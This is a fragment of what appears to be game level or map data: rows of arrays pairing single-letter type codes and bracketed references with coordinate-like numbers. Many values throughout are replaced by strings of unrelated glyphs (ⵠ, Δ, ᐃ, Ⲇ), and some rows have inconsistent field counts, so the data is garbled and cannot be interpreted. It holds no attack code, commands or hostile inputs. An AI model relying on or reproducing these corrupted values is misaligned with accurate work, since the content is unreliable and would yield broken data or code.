			[1, ⵠ[273], ⵠⲆΔ, 27, 32, ΔΔⵠ],
			[ⵠΔᐃ, ⵠ[273], ⲆⲆΔᐃ, 30, 33, ⲆΔⵠ],
			[1, ⵠ[273], 1, 29, 28, 0],
			[1, ⵠ[273], 2, 28, 31, 0],
			[ⵠΔᐃ, ⵠ[273], ᐃⲆΔⲆ, ⵠᐃΔᐃᐃ, 24, 0],
			[ᐃⲆᐃ, ⵠ[273], ⵠⵠΔⲆ, ⵠΔΔⲆⲆ, 26, 0],
			[1, ⵠ[273], ⵠⵠΔⲆ, 23, 16, 0],
			[ⵠΔⲆ, ⵠ[273], 2, ⲆⲆᐃΔⲆⲆⲆ, 25, 0],
			[1, ⵠ[348], 33, 29, 22, ᐃⵠⲆ],
			[1, ⵠ[348], 34, 32, 25, 0],
			[1, ⵠ[348], 34, 30, 18, 0],
			[1, ⵠ[348], 33, 78, ᐃᐃᐃᐃⲆ, Δⵠᐃ],
			[1, ⵠ[348], 33, 73, 35, ΔⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], 36, 72, 23, 0],
			[ᐃᐃⵠ, ⵠ[348], 35, 25, ⲆⵠⵠⲆⲆ, ΔⲆⲆ],
			[1, "d", ΔΔΔ, 83, 41, 1],
			[ⵠΔⲆ, "d", Ⲇᐃⵠ, ΔⵠⲆᐃⵠⲆᐃ, 40, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⲆ, 224, 104, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 224, 105, 1],
			[1, ⵠ[568], 3, 224, 106, ΔΔΔ],
			[ⵠΔⲆ, ⵠ[156], ⵠⵠⵠᐃ, 216, 128, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[156], ⵠⲆⲆ, 215, 126, 1],
			[1, "s", ΔⲆⲆ, 216, 130, 1],
			[ΔΔΔ, "s", 1, 217, 129, 1],
			[Ⲇᐃⵠ, "s", 0, 218, 128, 1],
			[1, "s", 1, 217, 127, ⵠⲆΔ],
			[ⵠⲆΔ, "s", ⲆΔⵠ, 217, 126, 1],
			[Ⲇᐃⵠ, "s", 1, 217, 125, ΔⲆⵠ],
			[1, "s", 0, 216, 124, ᐃᐃⵠ],
			[ⵠΔⲆ, "s", ᐃⲆᐃ, 215, 124, 1],
			[1, "s", 0, 214, 124, 1],
			[ⵠΔⲆ, "s", ΔⲆⵠ, 213, 125, 1],
			[ΔΔΔ, "s", 0, 213, 126, 1],
			[ᐃⲆᐃ, ⵠ[138], ⲆⲆΔᐃ, 217, 130, Δⵠᐃ],
			[1, ⵠ[138], ᐃⲆⵠᐃ, 212, 125, ⲆΔⵠ],
			[1, "p", 0, 214, 134, ᐃⲆᐃ],
			[ᐃⲆᐃ, "s", 1, 211, 126, 1],
			[ⵠΔᐃ, "b", ᐃᐃⵠ, 45, 277, ⵠⲆⲆ],
			[1, "b", ⵠΔⲆ, 50, 286, ⲆΔⵠ],
			[1, "b", ⲆⲆΔᐃ, 51, 284, 0],
			[ᐃⲆᐃ, "b", 1, 47, 287, ⲆΔⵠ],
			[ᐃⲆᐃ, "b", 0, 39, 285, ΔΔⵠ],
			[ΔⲆⵠ, "b", 3, 40, 283, ᐃⵠΔ],
			[1, "b", 0, 52, 283, 0],
			[ⵠⲆΔ, "b", ⵠΔᐃ, 51, 280, ᐃⵠΔ],
			[ᐃᐃⵠ, "g", 0, 45, 269, 1],
			[ⵠΔΔ, "p", 0, 55, 281, 1],
			[ΔⲆⵠ, "b", ⵠΔᐃ, ⲆΔΔᐃ, 172, 0],
			[1, "b", 2, 6, 172, ᐃⵠΔ],
			[ᐃᐃⵠ, "t", ⵠⵠΔΔ, 6, 171, ΔΔⵠ],
			[1, "t", 1, ᐃⲆⵠⵠ, 170, 0],
			[ⵠΔⲆ, "t", 1, 5, 164, ΔⲆⲆ],
			[1, "t", 3, 6, 164, 0],
			[1, "b", ΔⲆⲆ, 6, 165, 0],
			[ⵠⲆΔ, "t", ᐃⲆᐃᐃ, ΔⵠⲆⲆ, 165, Δⵠᐃ],
			[1, "b", 2, ⵠΔᐃΔⲆ, 166, 0],
			[ᐃᐃⵠ, "t", 4, 5, 166, 0],
			[1, "t", ⲆΔⵠᐃ, ⵠᐃΔⵠⲆ, 167, 0],
			[1, "t", ΔⵠᐃⲆ, ΔᐃⲆᐃ, 168, 0],
			[1, "t", ΔΔⵠ, 6, 169, 0],
			[ΔⲆⵠ, "t", 4, ⵠΔⵠᐃⵠ, 170, 0],
			[1, "t", ᐃⵠⲆ, 5, 167, Δⵠᐃ],
			[1, "t", ᐃⲆΔⲆ, ᐃΔΔΔ, 169, 0],
			[1, "b", ΔΔⵠ, ΔΔᐃⲆ, 168, ᐃⵠⲆ],
			[ⵠΔᐃ, "s", ᐃᐃⵠ, 7, 153, 1],
			[Ⲇᐃⵠ, "s", 2, ᐃΔⲆΔᐃ, 151, ⵠⲆΔ],
			[1, ⵠ[348], ᐃⲆⵠⵠ, 7, 152, ΔⲆⲆ],
			[ⵠΔΔ, "t", ⵠΔⲆ, 5, 154, ᐃΔΔ],
			[1, "b", 0, ⵠΔᐃΔⲆ, 154, Δⵠᐃ],
			[ⵠⲆΔ, "t", ΔⵠᐃⲆ, ⲆᐃⲆᐃ, 155, Δⵠᐃ],
			[ⵠΔⲆ, "b", 2, 6, 156, 0],
			[1, "t", 2, ΔΔᐃⲆ, 157, 0],
			[1, "t", 4, 5, 155, 0],
			[ΔΔΔ, "b", 0, 6, 157, 0],
			[1, "t", ᐃⲆᐃ, ᐃΔΔΔ, 156, ΔΔⵠ],
			[Ⲇᐃⵠ, "t", 5, 6, 158, ᐃⵠⲆ],
			[1, "b", ⵠⵠⵠΔ, 6, 159, ⵠⲆⲆ],
			[1, "b", ⵠⲆⲆ, 6, 162, 0],
			[1, "t", ᐃⵠⵠΔ, ΔᐃⲆᐃ, 163, ΔⲆⲆ],
			[ⵠⲆΔ, "t", Ⲇᐃⵠᐃ, 6, 161, 0],
			[Ⲇᐃⵠ, "b", 1, 6, 160, ΔⲆⲆ],
			[1, "b", ⲆⲆΔᐃ, 5, 163, ΔⲆⲆ],
			[1, "b", 2, 5, 158, 0],
			[1, "b", 2, ᐃⲆⵠⵠ, 161, ΔΔⵠ],
			[ΔⲆⵠ, "t", ⵠⲆΔ, 5, 162, ᐃⵠΔ],
			[1, "t", ᐃⲆᐃ, ᐃΔΔΔ, 160, ΔΔⵠ],
			[ᐃⲆᐃ, "b", 1, 85, 176, 0],
			[1, "b", ⲆⲆΔᐃ, 83, 178, Δⵠᐃ],
			[ⵠⲆΔ, "s", Ⲇᐃⵠ, 82, 177, ᐃⲆᐃ],
			[ΔΔΔ, "b", 0, 76, 172, 0],
			[1, "b", 3, 76, 174, ΔⲆⲆ],
			[ᐃᐃⵠ, "t", ΔⲆᐃⲆ, 73, 174, 0],
			[ᐃⲆᐃ, "t", ⲆΔΔᐃ, 72, 175, 0],
			[1, "t", ⵠᐃΔⵠ, 87, 173, 0],
			[1, ⵠ[348], 2, 76, 175, ⵠⲆⲆ],
			[1, ⵠ[348], 3, 77, 171, 0],
			[1, ⵠ[348], ᐃⲆΔⵠ, 86, 177, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 2, 71, 175, 0],
			[ⵠΔΔ, "s", ⵠⲆΔ, 70, 174, 1],
			[ⵠⲆΔ, "r", 48, 174, ᐃΔΔ],
			[1, "r", 49, 175, 0],
			[ΔⲆⵠ, "r", 50, 175, 0],
			[1, "r", 51, 175, 0],
			[1, "r", 51, 174, ΔⲆⲆ],
			[1, "r", 50, 174, 0],
			[1, "r", 49, 174, 0],
			[ⵠΔᐃ, "r", 52, 175, ΔΔⵠ],
			[1, "r", 52, 176, Δⵠᐃ],
			[1, "r", 51, 176, 0],
			[ⵠΔᐃ, "r", 50, 176, 0],
			[1, "r", 49, 176, ΔⲆⲆ],
			[ⵠⲆΔ, "r", 48, 175, Δⵠᐃ],
			[1, "r", 47, 175, 0],
			[ᐃⲆᐃ, "r", 48, 176, 0],
			[ᐃⲆᐃ, "r", 69, 163, ΔⲆⲆ],
			[ⵠΔΔ, "r", 70, 163, 0],
			[Ⲇᐃⵠ, "r", 71, 163, 0],
			[ⵠΔΔ, "r", 73, 163, 0],
			[1, "r", 72, 163, ᐃΔΔ],
			[1, "r", 73, 164, 0],
			[1, "r", 72, 164, 0],
			[1, "r", 71, 164, ΔⲆⲆ],
			[ⵠΔⲆ, "r", 70, 164, 0],
			[1, "r", 69, 164, ⲆΔⵠ],
			[ᐃᐃⵠ, "r", 68, 164, ΔΔⵠ],
			[ⵠΔΔ, "r", 68, 165, 0],
			[ⵠΔⲆ, "r", 69, 165, ΔⲆⲆ],
			[ⵠⲆΔ, "r", 70, 165, Δⵠᐃ],
			[1, "r", 71, 165, 0],
			[1, "r", 72, 165, 0],
			[Ⲇᐃⵠ, "r", 74, 164, ⲆΔⵠ],
			[ᐃⲆᐃ, "r", 73, 165, 0],
			[ᐃᐃⵠ, "r", 72, 166, 0],
			[1, "r", 71, 166, 0],
			[ΔⲆⵠ, "r", 70, 166, 0],
			[ᐃⲆᐃ, "r", 74, 165, ᐃΔΔ],
			[ᐃᐃⵠ, "r", 24, 164, 0],
			[ⵠΔⲆ, "r", 25, 164, 0],
			[Ⲇᐃⵠ, "r", 27, 164, 0],
			[1, "r", 26, 164, 0],
			[ⵠⲆΔ, "r", 28, 165, 0],
			[1, "r", 26, 165, 0],
			[1, "r", 27, 165, 0],
			[1, "r", 25, 165, ⵠⲆⲆ],
			[ⵠΔᐃ, "r", 24, 165, 0],
			[ⵠΔⲆ, "r", 23, 165, 0],
			[Ⲇᐃⵠ, "r", 22, 165, Δⵠᐃ],
			[1, "r", 21, 165, ᐃΔΔ],
			[ⵠΔⲆ, "r", 21, 166, 0],
			[1, "r", 22, 166, ΔⲆⲆ],
			[ⵠΔᐃ, "r", 23, 166, ⵠⲆⲆ],
			[1, "r", 24, 166, 0],
			[1, "r", 25, 166, 0],
			[1, "r", 26, 166, 0],
			[ᐃⲆᐃ, "r", 27, 166, ⲆΔⵠ],
			[1, "r", 28, 166, 0],
			[1, "r", 28, 167, ⲆΔⵠ],
			[1, "r", 26, 167, ᐃΔΔ],
			[ⵠΔᐃ, "r", 25, 167, 0],
			[1, "r", 24, 167, ᐃⵠⲆ],
			[ΔΔΔ, "r", 23, 167, 0],
			[ⵠⲆΔ, "r", 22, 167, 0],
			[ᐃⲆᐃ, "r", 27, 167, ᐃΔΔ],
			[1, "r", 29, 166, 0],
			[1, "r", 29, 167, Δⵠᐃ],
			[1, "r", 28, 168, 0],
			[ΔⲆⵠ, "r", 27, 168, 0],
			[1, "r", 26, 168, 0],
			[1, "r", 25, 168, ΔⲆⲆ],
			[ⵠⲆΔ, "r", 24, 168, ⵠⲆⲆ],
			[1, "r", 23, 168, 0],
			[ⵠⲆΔ, "r", 27, 169, Δⵠᐃ],
			[1, "r", 26, 169, ⲆΔⵠ],
			[Ⲇᐃⵠ, "r", 25, 169, 0],
			[ΔΔΔ, "r", 24, 169, 0],
			[ⵠⲆΔ, "r", 23, 169, ᐃⵠⲆ],
			[1, "r", 22, 168, 0],
			[ΔΔΔ, "r", 21, 167, 0],
			[1, "s", 1, 52, 174, ΔΔΔ],
			[1, "t", 3, 50, 177, 0],
			[ΔⲆⵠ, "t", 4, 49, 177, 0],
			[ⵠΔⲆ, "b", Δⵠᐃ, 47, 174, ⲆΔⵠ],
			[ⵠΔΔ, "b", ᐃⵠΔ, 69, 166, 0],
			[ᐃⲆᐃ, "t", ⲆⲆΔᐃ, 68, 166, 0],
			[1, "t", 5, 74, 163, Δⵠᐃ],
			[1, "t", 1, 73, 162, ΔⲆⲆ],
			[ⵠΔⲆ, "s", ᐃⵠⲆ, 73, 166, 1],
			[1, "s", ᐃⲆⵠᐃ, 76, 165, ΔΔΔ],
			[ᐃᐃⵠ, "g", ΔⵠᐃⲆ, 59, 175, 1],
			[1, "p", 0, 78, 168, 1],
			[1, "p", ΔΔⵠ, 61, 162, 1],
			[1, "p", 0, 42, 170, 1],
			[ΔΔΔ, "p", ᐃⵠⲆ, ΔΔⲆⵠᐃ, 174, ⵠⲆΔ],
			[ΔΔΔ, "p", ΔΔⵠ, 16, 160, ΔⲆⵠ],
			[ΔΔΔ, "b", 1, 23, 164, ΔⲆⲆ],
			[Ⲇᐃⵠ, "b", 1, 28, 169, ᐃΔΔ],
			[1, "b", ⵠⵠⵠΔ, 29, 168, ΔΔⵠ],
			[ⵠΔΔ, "b", 2, 16, 170, ⵠⲆⲆ],
			[1, "t", Ⲇᐃⵠ, 15, 171, ᐃⵠⲆ],
			[ⵠΔⲆ, "t", ᐃΔΔΔ, ᐃⲆⵠᐃⲆ, 175, ᐃⵠΔ],
			[1, "t", ᐃΔΔΔ, ᐃΔⲆΔⵠ, 166, ᐃΔΔ],
			[ⵠⲆΔ, "t", 5, 26, 163, 0],
			[ⵠΔΔ, "s", Ⲇᐃⵠ, 29, 165, Ⲇᐃⵠ],
			[1, "t", ᐃΔΔΔ, 11, 167, 0],
			[1, "t", 0, 29, 176, 0],
			[ΔΔΔ, "b", ⵠⵠⵠΔ, 30, 175, ⲆΔⵠ],
			[1, "t", ⵠⵠΔⲆ, 24, 177, 0],
			[Ⲇᐃⵠ, "b", 1, 37, 174, 0],
			[1, "b", 0, 35, 172, 0],
			[ⵠΔΔ, "b", ᐃᐃⲆⲆ, 37, 170, 0],
			[1, "t", 4, 38, 169, ΔⲆⲆ],
			[ΔⲆⵠ, "t", 4, 34, 173, ᐃⵠΔ],
			[ⵠΔⲆ, "t", ⵠᐃΔⵠ, 38, 175, ⲆΔⵠ],
			[ΔⲆⵠ, "b", 2, 39, 173, ΔΔⵠ],
			[ΔⲆⵠ, "t", ⲆΔⵠⵠ, 37, 176, 0],
			[ᐃⲆᐃ, "t", 4, 30, 168, Δⵠᐃ],
			[Ⲇᐃⵠ, "s", ΔⵠᐃⲆ, 35, 176, 1],
			[1, "s", 1, 41, 175, 1],
			[ⵠΔᐃ, "b", ⲆⲆΔᐃ, 53, 176, 0],
			[ⵠΔᐃ, "t", ⵠⵠΔΔ, 55, 173, 0],
			[ᐃⲆᐃ, "t", ᐃΔΔΔ, 45, 170, ᐃⵠⲆ],
			[ⵠⲆΔ, "b", ⵠΔᐃ, 53, 162, ⲆΔⵠ],
			[1, "b", ΔΔⵠ, 50, 164, 0],
			[1, "t", 2, 54, 163, 0],
			[1, "t", 3, 49, 165, ᐃⵠⲆ],
			[1, "t", ⲆⵠΔⵠ, 48, 160, Δⵠᐃ],
			[1, "t", 4, 57, 164, ⲆΔⵠ],
			[ⵠΔᐃ, "t", Ⲇᐃⵠᐃ, 66, 162, 0],
			[ⵠⲆΔ, "b", ᐃⲆᐃ, 86, 161, 0],
			[ⵠΔⲆ, "b", ⵠⵠΔⲆ, 81, 163, 0],
			[ᐃⲆᐃ, "t", ᐃⲆΔⵠ, 85, 162, ᐃⵠⲆ],
			[1, "t", 5, 81, 162, 0],
			[1, "t", 5, 88, 163, 0],
			[1, "t", ⵠΔᐃ, 84, 166, 0],
			[ΔΔΔ, "t", ᐃΔΔΔ, 72, 160, ⲆΔⵠ],
			[Ⲇᐃⵠ, "t", 5, 70, 170, 0],
			[ΔⲆⵠ, "s", 1, 57, 162, ᐃᐃⵠ],
			[1, "b", 1, 39, 161, ᐃΔΔ],
			[1, "b", ᐃⵠⲆ, 34, 164, 0],
			[ᐃⲆᐃ, "b", 2, 54, 164, Δⵠᐃ],
			[ⵠΔᐃ, "t", ⵠⲆΔ, 59, 169, 0],
			[1, "t", ΔⲆᐃⲆ, 60, 170, 0],
			[ⵠΔΔ, "t", ᐃⵠⵠΔ, 63, 169, 0],
			[1, "t", ⵠᐃΔΔ, 63, 174, 0],
			[1, "t", 1, 62, 175, 0],
			[ⵠΔⲆ, "t", ᐃⲆⵠⵠ, 40, 162, ᐃΔΔ],
			[ⵠⲆΔ, "t", ΔΔΔ, 63, 180, 0],
			[ᐃᐃⵠ, "t", 2, 64, 179, 0],
			[ⵠΔᐃ, "t", ᐃⲆⵠᐃ, 35, 165, 0],
			[Ⲇᐃⵠ, "s", 1, 63, 173, 1],
			[1, "s", 2, 40, 165, ⵠΔⲆ],
			[1, "b", ⵠⲆⲆ, 46, 169, ᐃΔΔ],
			[1, ⵠ[348], 22, 74, 168, 0],
			[Ⲇᐃⵠ, ⵠ[348], 22, 86, 168, 0],
			[1, ⵠ[348], 22, 83, 175, Δⵠᐃ],
			[1, ⵠ[348], 22, 78, 175, 0],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 72, 176, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 68, 168, 0],
			[ᐃᐃⵠ, ⵠ[348], ⵠⲆᐃΔᐃ, 65, 163, 0],
			[ⵠΔᐃ, ⵠ[348], ⲆⲆⵠΔⵠ, 75, 162, 0],
			[1, ⵠ[348], 19, 80, 162, 0],
			[ΔⲆⵠ, ⵠ[348], ⲆⲆⵠΔⵠ, 88, 159, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 87, 164, 0],
			[1, ⵠ[348], 19, 61, 177, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[348], 19, 59, 172, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 59, 167, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], 19, 53, 165, ⲆΔⵠ],
			[1, ⵠ[348], ⵠΔⵠⵠⵠ, 56, 163, 0],
			[ᐃⲆᐃ, ⵠ[348], 19, 51, 161, 0],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 48, 167, ΔΔⵠ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 47, 170, 0],
			[1, ⵠ[348], ΔΔΔΔⲆ, 41, 163, ᐃΔΔ],
			[ⵠⲆΔ, ⵠ[348], 19, 37, 161, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 36, 166, 0],
			[ᐃᐃⵠ, ⵠ[348], ΔΔⲆᐃⵠ, 36, 171, ᐃⵠⲆ],
			[ⵠⲆΔ, ⵠ[348], 19, 34, 174, 0],
			[ᐃⲆᐃ, ⵠ[348], 19, 40, 172, 0],
			[ⵠΔΔ, ⵠ[348], ΔⲆⲆⲆⵠ, 38, 177, Δⵠᐃ],
			[ⵠΔΔ, ⵠ[348], ᐃΔⲆΔⵠ, 42, 176, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[348], 19, 53, 178, 0],
			[ⵠΔⲆ, ⵠ[348], 19, 53, 172, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠΔⲆ, 64, 181, ⲆΔⵠ],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 64, 175, ⲆΔⵠ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 79, 172, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 30, 170, 0],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, ⵠᐃΔΔΔⲆⲆ, 168, ᐃⵠⲆ],
			[ⵠⲆΔ, ⵠ[348], 19, 14, 173, Δⵠᐃ],
			[1, ⵠ[348], 19, ΔᐃΔⵠⵠ, 162, ᐃΔΔ],
			[ᐃⲆᐃ, ⵠ[348], ᐃΔΔⲆΔ, ΔⲆⵠΔⲆ, 167, 0],
			[1, ⵠ[348], 19, ΔΔⲆⵠᐃ, 161, ΔΔⵠ],
			[1, ⵠ[348], 19, 27, 162, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], ΔΔⲆᐃⵠ, 83, 195, 0],
			[Ⲇᐃⵠ, ⵠ[348], 2, 85, 163, ΔΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 2, 80, 164, ᐃΔΔ],
			[1, ⵠ[348], ⲆⲆΔᐃ, 84, 169, ⵠⲆⲆ],
			[1, ⵠ[348], ᐃⲆⵠᐃ, 55, 165, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], ᐃⲆᐃᐃ, 46, 163, Δⵠᐃ],
			[1, ⵠ[348], ᐃⲆΔⲆ, 66, 169, ⲆΔⵠ],
			[1, ⵠ[348], 0, 63, 175, ⲆΔⵠ],
			[1, ⵠ[348], 0, 34, 164, ΔΔⵠ],
			[1, ⵠ[348], 0, ⲆⵠΔⵠⵠ, 160, 0],
			[1, ⵠ[348], ⲆⲆΔᐃ, 40, 160, 0],
			[1, ⵠ[348], ᐃⲆΔⲆ, 53, 160, 0],
			[1, ⵠ[348], ⵠⵠⵠΔ, 14, 170, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], ⵠⵠⵠΔ, 19, 175, 0],
			[1, ⵠ[348], 2, 23, 176, ΔΔⵠ],
			[1, ⵠ[348], ⲆΔΔᐃ, 60, 147, 0],
			[Ⲇᐃⵠ, ⵠ[348], 33, 59, 160, 0],
			[ΔⲆⵠ, ⵠ[348], 33, 85, 157, ᐃⵠΔ],
			[1, ⵠ[348], 33, 29, 143, 0],
			[ⵠΔᐃ, ⵠ[348], 33, 62, 140, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[348], 33, 43, 127, 0],
			[ᐃᐃⵠ, ⵠ[348], 33, ⲆⵠΔⵠⵠ, 129, 0],
			[1, ⵠ[348], 33, 50, 134, 0],
			[ⵠΔⲆ, ⵠ[348], 33, 79, 127, 0],
			[1, ⵠ[348], 33, 89, 139, 0],
			[ⵠΔΔ, "b", 1, 44, 156, ᐃⵠⲆ],
			[ⵠΔⲆ, "t", ⵠⵠⵠΔ, 45, 157, ⲆΔⵠ],
			[ⵠΔᐃ, "b", 0, 75, 156, ⲆΔⵠ],
			[1, "t", ΔⲆᐃⲆ, 76, 157, 0],
			[ΔΔΔ, "t", ΔΔᐃⲆ, 62, 157, ᐃⵠⲆ],
			[1, "t", ᐃΔΔⲆ, 79, 156, 0],
			[1, "t", 5, 41, 156, ᐃⵠⲆ],
			[1, "b", ⵠΔΔ, 28, 156, ᐃΔΔ],
			[1, "t", ᐃⲆΔⲆ, 27, 157, 0],
			[ⵠΔⲆ, "t", Ⲇⵠⵠⵠ, 21, 156, ΔⲆⲆ],
			[ΔΔΔ, "t", 4, 56, 159, 0],
			[ΔΔΔ, "f", ΔΔΔ, 94, 153, ΔⲆⵠ],
			[1, "f", 2, 93, 153, ⵠⲆΔ],
			[1, "f", ⵠⵠΔⲆ, 99, 153, 1],
			[ⵠⲆΔ, "f", ⵠΔᐃ, 98, 153, 1],
			[ⵠΔΔ, "f", ⵠⲆⲆ, 97, 153, 1],
			[Ⲇᐃⵠ, "f", ΔⲆⵠ, 96, 153, 1],
			[1, "s", ΔΔΔ, 7, 149, ΔⲆⵠ],
			[1, ⵠ[348], ⲆΔⵠᐃ, ᐃⲆⲆᐃᐃ, 150, 0],
			[1, "b", 3, 43, 281, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 50, 24, 39, ᐃⵠⲆ],
			[1, ⵠ[348], 50, 21, 39, 0],
			[1, ⵠ[348], 50, 22, 43, 0],
			[ⵠⲆΔ, ⵠ[348], 50, 15, 34, 0],
			[ⵠΔᐃ, ⵠ[348], 50, ᐃΔᐃΔᐃ, 26, Δⵠᐃ],
			[1, ⵠ[348], 50, 44, 42, ᐃⵠΔ],
			[1, ⵠ[348], 50, 57, 39, 0],
			[1, ⵠ[348], 50, 62, 43, 0],
			[Ⲇᐃⵠ, ⵠ[348], 50, 77, 44, 0],
			[ⵠⲆΔ, ⵠ[348], 50, 71, 41, 0],
			[ⵠΔΔ, ⵠ[348], 50, 55, 39, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], 50, 22, 39, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], 50, ΔᐃⲆⵠᐃ, 41, 0],
			[1, ⵠ[348], 50, ⲆⵠΔⵠⵠ, 21, ⵠⲆⲆ],
			[1, ⵠ[348], 50, 15, 21, ⵠⲆⲆ],
			[1, ⵠ[348], 50, ⲆⵠⲆᐃΔ, ᐃⲆᐃⵠⵠ, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 50, ΔⲆⲆΔΔ, 17, 0],
			[1, ⵠ[348], 50, 18, ⲆⵠⲆⵠⲆ, ⵠⲆⲆ],
			[1, ⵠ[348], 50, ᐃⵠⲆΔΔ, ⲆΔⲆΔⵠ, 0],
			[1, ⵠ[348], 50, 52, 41, 0],
			[ᐃᐃⵠ, ⵠ[348], 50, 82, 39, ᐃⵠⲆ],
			[1, ⵠ[348], 50, 86, 38, ⲆΔⵠ],
			[1, ⵠ[348], 50, 84, 31, 0],
			[ΔΔΔ, ⵠ[348], 50, 86, 30, 0],
			[ΔⲆⵠ, ⵠ[348], 50, 84, 26, 0],
			[ⵠΔΔ, ⵠ[348], 50, 86, 23, 0],
			[ⵠΔⲆ, ⵠ[348], 50, 86, ΔⲆᐃᐃᐃ, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], 50, 29, 42, 0],
			[1, ⵠ[348], 9, 74, 37, 0],
			[1, ⵠ[348], 9, 76, 22, ⲆΔⵠ],
			[1, ⵠ[348], ⲆΔΔᐃᐃ, 79, 24, ᐃⵠⲆ],
			[1, ⵠ[348], 11, 77, 17, 0],
			[1, ⵠ[348], 36, 81, 25, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], 36, 80, 36, ⵠⲆⲆ],
			[1, ⵠ[348], 36, 21, 36, ᐃⵠⲆ],
			[1, ⵠ[348], 28, 23, 22, ΔΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 28, 27, 31, Δⵠᐃ],
			[ⵠⲆΔ, ⵠ[348], 28, 69, 36, 0],
			[1, ⵠ[348], 28, 80, ΔΔⲆⵠᐃ, 0],
			[1, ⵠ[348], 51, 24, 155, Δⵠᐃ],
			[ᐃᐃⵠ, ⵠ[348], 51, ΔⲆΔᐃᐃ, 154, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 51, 11, 154, Δⵠᐃ],
			[1, ⵠ[348], 51, 12, 156, 0],
			[1, ⵠ[348], 51, ΔΔᐃᐃΔ, 154, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 51, 20, 154, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 51, 23, 154, 0],
			[Ⲇᐃⵠ, ⵠ[348], 51, 18, 157, 0],
			[ⵠⲆΔ, ⵠ[348], 51, 31, 154, 0],
			[ⵠΔΔ, ⵠ[348], 51, 32, 157, 0],
			[ᐃⲆᐃ, ⵠ[348], 51, 86, 154, 0],
			[1, ⵠ[348], 51, 88, 156, 0],
			[ᐃᐃⵠ, ⵠ[348], 51, 82, 154, 0],
			[1, ⵠ[348], 51, 80, 154, ΔΔⵠ],
			[1, ⵠ[348], 51, 77, 154, ᐃⵠΔ],
			[ᐃᐃⵠ, ⵠ[348], 51, 74, 154, 0],
			[1, ⵠ[348], 51, 71, 154, 0],
			[1, ⵠ[348], 51, 67, 154, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], 51, 60, 154, ΔΔⵠ],
			[1, ⵠ[348], 51, 57, 154, 0],
			[1, ⵠ[348], 51, 65, 154, 0],
			[Ⲇᐃⵠ, ⵠ[348], 51, 68, 156, 0],
			[ⵠΔΔ, ⵠ[348], 51, 59, 156, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], 51, 55, 154, ΔΔⵠ],
			[1, ⵠ[348], 51, 54, 154, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 51, 52, 154, 0],
			[ⵠΔΔ, ⵠ[348], 51, 55, 155, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 51, 54, 157, 0],
			[ΔⲆⵠ, ⵠ[348], 51, 49, 154, ΔⲆⲆ],
			[1, ⵠ[348], 51, 46, 154, ΔⲆⲆ],
			[1, ⵠ[348], 51, 44, 154, 0],
			[ⵠΔⲆ, ⵠ[348], 51, 43, 154, ΔⲆⲆ],
			[1, ⵠ[348], 51, 41, 154, 0],
			[1, ⵠ[348], 51, 38, 154, 0],
			[ⵠΔᐃ, ⵠ[348], 51, 39, 156, 0],
			[1, ⵠ[348], 51, 34, 154, ⵠⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], ΔΔᐃⲆ, ΔΔⵠΔⲆ, 142, 0],
			[Ⲇᐃⵠ, ⵠ[348], 5, 37, 147, ᐃⵠΔ],
			[1, ⵠ[348], 7, 53, 147, Δⵠᐃ],
			[1, ⵠ[348], 6, 69, 150, ᐃⵠⲆ],
			[1, ⵠ[348], ⵠΔᐃΔ, 94, 148, 0],
			[ᐃᐃⵠ, ⵠ[348], 4, 66, 147, ᐃⵠΔ],
			[1, ⵠ[348], ⵠᐃᐃⲆ, ⲆⵠΔΔᐃ, 145, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ⵠᐃΔΔ, 28, 137, 0],
			[1, ⵠ[348], ⲆᐃᐃΔ, ΔⲆᐃᐃⲆ, 137, 0],
			[1, ⵠ[348], 4, 48, 134, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], 5, 67, 135, 0],
			[ⵠΔΔ, ⵠ[348], 34, 84, 155, ⲆΔⵠ],
			[1, ⵠ[348], 35, 70, 156, ᐃⵠⲆ],
			[1, ⵠ[348], 35, 51, 156, ΔⲆⲆ],
			[1, ⵠ[348], 35, 56, 157, 0],
			[1, ⵠ[348], 35, 65, 159, ᐃΔΔ],
			[ᐃⲆᐃ, ⵠ[348], 35, 23, 156, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], 35, ΔⲆΔⲆⲆ, 155, 0],
